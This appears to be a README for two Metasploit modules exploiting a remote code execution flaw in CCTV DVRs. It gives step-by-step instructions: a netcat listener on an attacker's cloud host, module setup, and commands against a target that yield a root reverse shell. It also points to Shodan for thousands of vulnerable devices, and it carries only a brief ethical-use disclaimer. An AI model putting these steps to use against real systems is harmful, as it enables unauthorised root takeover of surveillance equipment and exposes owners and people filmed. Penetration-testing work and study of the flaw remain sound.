This code is adapted from the genius Rotem Kerner's python exploit into 2 metasploit modules to allow for easy pen testing of systems that utilise CCTV DVR's. If you go onto shodan.io and type in Cross Web Server, there are thousands of vulnerable web hosts, many of them presumably already exploited. This exploit should only be used for ethical, legal and authorised penetration tests.

http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html

Instructions for Use:

Set up a cloud host or web facing IP.

Step 1:

On this cloud host type

nc -l 666

On another host, or the same host in another window (making sure metasploit is installed)

Step 1:

cd /usr/share/metasploit-framework/modules/exploits/linux/http

Step 2:

git clone https://github.com/freddiebarrsmith/CCTV-Remote-Code-Execution-Metasploit-Module.git

Step 3:

edit the line containing host = "192.168.0.1" inside CCTV_DVRwrite.rb to be the ip of your cloud host


Step 4:

type msfconsole

Step 5:

use exploit/linux/http/CCTV_DVRwrite 
set RHOST yourtargethost.com
set RPORT 81 
exploit

(then wait for it to execute, ignore errors for the most part) Step 6:

use exploit/linux/http/CCTV_DVRrun 
set RHOST yourtargethost.com 
set RPORT 81 
exploit

(then wait for it to execute, ignore errors for the most part)

Step 7:

go back to your cloud or web-facing ip netcat session and type in:

whoami

to get the answer

root

if the exploit executed succesfully
